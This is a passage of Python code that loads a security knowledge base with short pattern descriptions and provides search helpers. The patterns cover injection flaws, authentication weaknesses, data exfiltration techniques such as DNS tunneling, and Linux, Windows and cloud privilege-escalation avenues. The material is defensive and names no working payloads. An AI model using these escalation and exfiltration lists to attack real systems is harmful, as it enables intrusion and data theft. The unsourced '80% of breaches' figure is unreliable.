        ("injection_vulnerabilities", "Injection vulnerability patterns: SQL injection: direct string concatenation in queries, unsanitized user input in LIKE/IN clauses, dynamic table/column names. Command injection: user input passed to os.system/subprocess without validation. NoSQL injection: $where, $gt, ne operators passed directly. Template injection: user input in template rendering (Jinja2 unsafe patterns). Pattern: any time user input becomes code without proper escaping. Prevention: parameterized queries, input validation, ORM frameworks."),
        ("auth_weakness", "Authentication weakness patterns: No rate limiting on login endpoints. Weak password policies. JWT without proper expiration. Tokens sent in URL parameters. Session fixation. Missing MFA on admin accounts. Password reset without verification. 'Remember me' implemented insecurely. Pattern: authentication weaknesses account for 80% of web application breaches. Prevention: OWASP ASVS guidelines, security headers, proper session management."),
        ("data_exfiltration", "Data exfiltration patterns: Large file uploads to external cloud storage. API calls to unusual endpoints. Data encoded in DNS queries (DNS tunneling). Steganography in image uploads. Unusual database export operations. Email forwarding to external addresses. USB mass storage device connections. Pattern: exfiltration often happens slowly over time to avoid detection. Detect by: DLP systems, data access monitoring, egress traffic analysis, user behavior analytics."),
        ("privilege_escalation", "Privilege escalation patterns: Linux: SUID binaries, writable /etc/shadow, kernel exploits, cron jobs, sudo misconfigurations, Docker socket exposure, LXC/LXD groups. Windows: unquoted service paths, vulnerable drivers, always install elevated, UAC bypass, token impersonation, DLL hijacking. Cloud: overly permissive IAM roles, trust policies to external accounts, service account key leakage. Pattern: escalation follows the path of least resistance."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": EAGLE_EYE_PATTERNS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def search_knowledge(query: str, collection: str = None, n_results: int = 5) -> list:
    kb = get_knowledge_base()
    col_name = collection
    if col_name and col_name in COLLECTION_NAMES:
        try:
            col = kb.get_collection(col_name)
            results = col.query(query_texts=[query], n_results=n_results)
            return results
        except Exception:
            return []
    all_results = {}
    for name in COLLECTION_NAMES:
        try:
            col = kb.get_collection(name)
            results = col.query(query_texts=[query], n_results=n_results)
            if results.get("documents") and results["documents"][0]:
                all_results[name] = results["documents"][0]
        except Exception:
            pass
    return all_results


def get_knowledge_collection_names() -> list:
    return list(COLLECTION_NAMES)
